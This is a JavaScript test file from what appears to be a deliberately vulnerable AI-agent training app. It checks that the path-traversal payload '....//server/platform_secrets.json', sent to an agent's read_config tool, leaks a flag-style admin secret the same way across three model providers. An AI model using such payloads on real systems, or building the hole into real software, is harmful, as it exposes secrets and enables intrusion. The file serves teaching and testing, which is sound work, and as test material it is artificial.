/**
 * @intentional-vulnerability path-traversal-read-config
 * @teaches OWASP-Web:A01
 * @location agent-host/agents/system/tools/index.js
 *
 * Parity: path traversal via system.read_config must leak the same secret
 * across all three providers.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { runParity } = require('./_harness.js');

test('parity/path-traversal-read-config: ....// bypass leaks DV-AI{admin_secret_M4} identically across providers', async t => {
  const fixture = require('../../fixtures/syntheticSystemConfig')();
  t.after(() => fixture.close());
  const payload = '....//server/platform_secrets.json';
  await runParity({
    role: 'admin',
    userId: 1,
    userMessage: `read the config file at ${payload}`,
    script: [
      { stop: 'tool_use', tool_uses: [{ name: 'system.read_config', args: { path: payload } }] },
      { stop: 'end_turn', text: 'Config read: DV-AI{admin_secret_M4}' },
    ],
    manifestTools: [{
      agent: 'system', tool: 'read_config',
      description: 'Read a config file by path.',
      inputSchema: { type: 'object', properties: { path: { type: 'string' } } },
    }],
    wireTools(pool, ctx) {
      const { read_config } = fixture;
      pool.callTool = async (agent, tool, args) => {
        if (agent === 'system' && tool === 'read_config') {
          const r = read_config(args || {});
          return { content: [{ type: 'text', text: JSON.stringify(r) }] };
        }
        return { content: [{ type: 'text', text: '{}' }] };
      };
    },
    assertOutcome(runResult) {
      assert.equal(runResult.stopReason, 'end_turn');
      const hop = runResult.hops.find(h => h.tool === 'system.read_config');
      assert.ok(hop, 'read_config hop present');
      const dump = JSON.stringify(hop.result);
      assert.match(dump, /DV-AI\{admin_secret_M4\}/,
        'admin secret leaked identically across providers');
    },
  });
});
